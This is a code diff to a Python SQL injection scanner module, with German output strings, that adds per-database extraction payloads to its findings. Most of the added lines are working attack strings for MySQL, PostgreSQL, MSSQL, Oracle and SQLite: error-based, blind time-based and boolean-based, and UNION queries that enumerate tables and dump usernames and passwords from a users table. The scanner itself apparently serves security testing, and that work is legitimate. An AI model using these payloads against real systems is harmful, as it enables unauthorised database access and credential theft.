@@ -2,6 +2,7 @@
 """
 SQLMap Scanner Module - Advanced SQL Injection Detection
 Comprehensive Python fallback with error/boolean/time/union-based detection
+Shows extraction examples for each SQLi type found
 """
 import requests
 import re
@@ -47,6 +48,36 @@ SQLI_PAYLOADS = {
         'union': ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT sqlite_version(),NULL--"],
         'boolean': ["' AND 1=1--", "' AND 1=2--"],
     },
+}
+
+EXTRACTION_EXAMPLES = {
+    'mysql': [
+        "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--  → DB-Version",
+        "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--  → DB-Name",
+        "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--  → ALLE Tabellen",
+        "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--  → Spalten von 'users'",
+        "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users),0x7e))--  → User+Passwoerter!",
+    ],
+    'postgresql': [
+        "' AND 1=cast((SELECT version()) as integer)--  → DB-Version",
+        "' AND 1=cast((SELECT current_database()) as integer)--  → DB-Name",
+        "' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') as integer)--  → Tabellen",
+    ],
+    'mssql': [
+        "' AND 1=@@version--  → DB-Version",
+        "' AND 1=DB_NAME()--  → DB-Name",
+        "'; SELECT table_name FROM information_schema.tables FOR XML PATH('')--  → Tabellen",
+    ],
+    'oracle': [
+        "' OR 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--  → DB-Version",
+        "' AND 1=(SELECT COUNT(*) FROM user_tables)--  → Tabellen-Anzahl",
+        "' UNION SELECT NULL,table_name,NULL FROM user_tables--  → Tabellennamen",
+    ],
+    'sqlite': [
+        "' AND sqlite_version()--  → DB-Version",
+        "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--  → Tabellendefinitionen",
+        "' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--  → Tabellennamen",
+    ],
 }
 
 
@@ -106,6 +137,7 @@ def scan(target):
         return findings
 
     payloads = SQLI_PAYLOADS.get(db_type, SQLI_PAYLOADS['mysql'])
+    examples = EXTRACTION_EXAMPLES.get(db_type, EXTRACTION_EXAMPLES['mysql'])
 
     # Error-based
     error_findings = []
@@ -123,10 +155,20 @@ def scan(target):
         best = error_findings[0]
         findings.append({
             'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_error_based',
-            'title': f'[SQLMap] Error-Based SQL Injection ({db_type.upper()})',
+            'title': f'[SQLMap] Error-Based SQL Injection ({db_type.upper()}) - DATEN AUSLESBAR!',
             'url': f'{target}?id=',
-            'evidence': f'ERROR-BASED SQLi BESTATIGT!\nDB: {db_type.upper()}\nPayload: id={best["payload"]}\nFehler: {best["indicator"]}',
-            'remediation': 'SOFORT Prepared Statements implementieren!'
+            'evidence': (
+                f'=== Error-Based SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
+                f'Datenbank: {db_type.upper()}\n'
+                f'Payload: id={best["payload"]}\n'
+                f'Fehler: {best["indicator"]}\n\n'
+                f'=== BEISPIELE zum Daten auslesen: ===\n'
+                + '\n'.join(f'  {ex}' for ex in examples) +
+                f'\n\n'
+                f'Mit Error-Based kann man via Fehlermeldungen\n'
+                f'die KOMPLETTE Datenbank auslesen - Buchstabe fuer Buchstabe!'
+            ),
+            'remediation': 'SOFORT Prepared Statements! Error-Display in Production DEAKTIVIEREN!'
         })
         scan_id += 1
 
@@ -151,10 +193,25 @@ def scan(target):
         best = max(time_findings, key=lambda x: x['delay'])
         findings.append({
             'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_time_based',
-            'title': f'[SQLMap] Time-Based Blind SQL Injection ({db_type.upper()})',
+            'title': f'[SQLMap] Time-Based Blind SQLi ({db_type.upper()}) - DATEN AUSLESBAR!',
             'url': f'{target}?id=',
-            'evidence': f'TIME-BASED SQLi BESTATIGT!\nDelay: {best["delay"]}s\nPayload: id={best["payload"]}\nDatenbank hat SLEEP() ausgefuehrt!',
-            'remediation': 'SOFORT Prepared Statements!'
+            'evidence': (
+                f'=== Time-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
+                f'Normal: ~{n_time:.1f}s | Mit Payload: ~{p_time:.1f}s\n'
+                f'DELAY: {best["delay"]} SEKUNDEN!\n'
+                f'Payload: id={best["payload"]}\n\n'
+                f'=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n'
+                f"  ' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(3),0)--\n"
+                f"    → Erster Buchstabe der Version > 'A'?\n"
+                f"  ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(3),0)--\n"
+                f"    → Erster Buchstabe des Passworts > 'A'?\n"
+                f"  ' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(3),0)--\n"
+                f"    → Mehr als 10 Tabellen?\n\n"
+                f"Mit Time-Based kann man via Zeitverzoegerung\n"
+                f"die KOMPLETTE Datenbank bit fuer bit auslesen!\n"
+                f"Langsam aber 100% zuverlaessig!"
+            ),
+            'remediation': 'SOFORT Prepared Statements! Alle User-Inputs parametrisieren!'
         })
         scan_id += 1
 
@@ -175,9 +232,24 @@ def scan(target):
         best = boolean_findings[0]
         findings.append({
             'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_boolean_based',
-            'title': f'[SQLMap] Boolean-Based Blind SQL Injection ({db_type.upper()})',
+            'title': f'[SQLMap] Boolean-Based Blind SQLi ({db_type.upper()}) - DATEN AUSLESBAR!',
             'url': f'{target}?id=',
-            'evidence': f'BOOLEAN-BASED SQLi BESTATIGT!\nTRUE: {best["true_p"]}\nFALSE: {best["false_p"]}\nDiff: {best["diff"]} bytes!',
+            'evidence': (
+                f'=== Boolean-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
+                f'TRUE:  id={best["true_p"]}\n'
+                f'FALSE: id={best["false_p"]}\n'
+                f'Unterschied: {best["diff"]} bytes\n\n'
+                f'=== Boolean-Based Extraktion (Ja/Nein Fragen): ===\n'
+                f"  ' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--\n"
+                f"    → Ist erster Buchstabe der Version > \"A\"?\n"
+                f"  ' AND LENGTH((SELECT password FROM users LIMIT 1))>5--\n"
+                f"    → Passwort laenger als 5 Zeichen?\n"
+                f"  ' AND (SELECT COUNT(*) FROM information_schema.tables)>10--\n"
+                f"    → Mehr als 10 Tabellen?\n\n"
+                f"Mit Boolean-Based kann man via TRUE/FALSE Antworten\n"
+                f"die KOMPLETTE Datenbank bit fuer bit auslesen!\n"
+                f"Langsam aber sehr zuverlaessig!"
+            ),
             'remediation': 'Prepared Statements + Input-Validierung SOFORT!'
         })
         scan_id += 1
@@ -192,12 +264,35 @@ def scan(target):
 
     if union_findings:
         best = union_findings[0]
+        cols = best["columns"]
+        union_extract = []
+        if cols >= 1:
+            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-1)}version()--  → DB-Version")
+        if cols >= 2:
+            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-2)}user(),database()--  → User + DB")
+        if cols >= 3:
+            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-3)}table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--  → Spalten")
+        if cols >= 4:
+            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-4)}id,username,password FROM users LIMIT 1--  → User-Daten!")
+
         findings.append({
             'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_union_based',
-            'title': f'[SQLMap] UNION-Based SQL Injection ({best["columns"]} Spalten, {db_type.upper()})',
+            'title': f'[SQLMap] UNION SQLi ({cols} Spalten, {db_type.upper()}) - DIREKTER DATENZUGRIFF!',
             'url': f'{target}?id=',
-            'evidence': f'UNION-BASED SQLi BESTATIGT!\nUNION SELECT mit {best["columns"]} Spalten akzeptiert!\nPayload: id={best["payload"]}',
-            'remediation': 'Prepared Statements! NIEMALS User-Input in Queries!'
+            'evidence': (
+                f'=== UNION SQLi BESTATIGT - DIREKTER DATENZUGRIFF! ===\n\n'
+                f'UNION SELECT mit {cols} Spalten wird AKZEPTIERT!\n'
+                f'Payload: id={best["payload"]}\n\n'
+                f'=== BEISPIELE zum direkten Auslesen: ===\n'
+                + '\n'.join(f'  {ex}' for ex in union_extract) +
+                f'\n\n'
+                f'=== KOMPLETTER Daten-Dump: ===\n'
+                f"  ' UNION SELECT {'NULL,' * (cols-1)}group_concat(username,':',password) FROM users--\n"
+                f'  → ALLE Usernamen + Passwoerter auf einmal!\n\n'
+                f'UNION ist die SCHNELLSTE SQLi-Methode!\n'
+                f'Direkter Zugriff auf ALLE Datenbank-Inhalte!'
+            ),
+            'remediation': 'SOFORT Prepared Statements! NIEMALS User-Input in Queries!'
         })
         scan_id += 1
 
@@ -215,8 +310,16 @@ def scan(target):
             'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_summary',
             'title': f'[SQLMap] SQL Injection BESTATIGT via {len(findings)} Methoden!',
             'url': target,
-            'evidence': f'SQL INJECTION auf {db_type.upper()}!\nError: {"JA" if error_findings else "NEIN"}\nTime: {"JA" if time_findings else "NEIN"}\nBoolean: {"JA" if boolean_findings else "NEIN"}\nUnion: {"JA" if union_findings else "NEIN"}',
-            'remediation': 'SOFORT patchen!'
+            'evidence': (
+                f'SQL INJECTION auf {db_type.upper()} nachweisbar!\n\n'
+                f'Methoden:\n'
+                f'- Error-Based: {"JA" if error_findings else "NEIN"}\n'
+                f'- Time-Based: {"JA" if time_findings else "NEIN"}\n'
+                f'- Boolean-Based: {"JA" if boolean_findings else "NEIN"}\n'
+                f'- Union-Based: {"JA" if union_findings else "NEIN"}\n\n'
+                f'ALLE Methoden ermoeglichen Daten-Auslesen!'
+            ),
+            'remediation': 'SOFORT patchen! Siehe Details bei jedem Finding!'
         })
 
     return findings
